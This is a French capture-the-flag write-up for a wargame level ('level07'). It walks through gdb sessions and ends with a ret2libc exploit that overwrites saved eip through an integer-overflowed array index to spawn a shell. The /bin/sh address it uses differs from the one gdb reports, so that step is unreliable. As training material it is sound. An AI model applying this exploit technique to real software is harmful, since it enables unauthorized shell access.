## Etape 1: Trouver l'adresse de system

```bash
(gdb) run
Starting program: /home/users/level07/level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: ^C  
Program received signal SIGINT, Interrupt.
0xf7fdb440 in __kernel_vsyscall ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

adresse system = 0xf7e6aed0 = 4159090384

## Etape 2: Trouver l'adresse de /bin/sh

```bash
(gdb) run
Starting program: /home/users/level07/level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: ^C
Program received signal SIGINT, Interrupt.
0xf7fdb440 in __kernel_vsyscall ()
(gdb) find &system, +9999999, "/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) 
```

adresse /bin/sh = 0xf7fd3b74 = 4160264172

## Etape 3: 

```bash
(gdb) b *main+15
Breakpoint 1 at 0x8048732
(gdb) run
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048732 in main ()
(gdb) print $esp + 0x24
$1 = (void *) 0xffffd114
(gdb) info frame
Stack level 0, frame at 0xffffd2e0:
 eip = 0x8048732 in main; saved eip 0xf7e45513
 Arglist at 0xffffd2d8, args: 
 Locals at 0xffffd2d8, Previous frame's sp is 0xffffd2e0
 Saved registers:
  ebp at 0xffffd2d8, eip at 0xffffd2dc
(gdb) ^CQuit
(gdb) 

```

On fait 0xffffd2dc - 0xffffd114 = 1C8 = 456(10)

456 / 4 = 114

114 est l'id pour ecraser eip

## Etape 4: Contourner 114 multiple de 3
On cherche a trouver un nombre qui va overflow et qui amenera a l'index 114.
Comme notre achitecture et en 32 bits et la taille d'un int est de 4 on a :


114 + 2^32 / 4 = 1073741938

## Etape 4: Execution

Afin de maintenir stdin ouvert après l'exécution du shellcode, nous utilisons la commande `cat` en pipeline.

```shell
(python -c 'print "store\n4159090384\n1073741938\nstore\n1\n115\nstore\n4160264172\n116\nquit"'; cat) | ./level07
```

--> Nous pouvons passer au level08 !
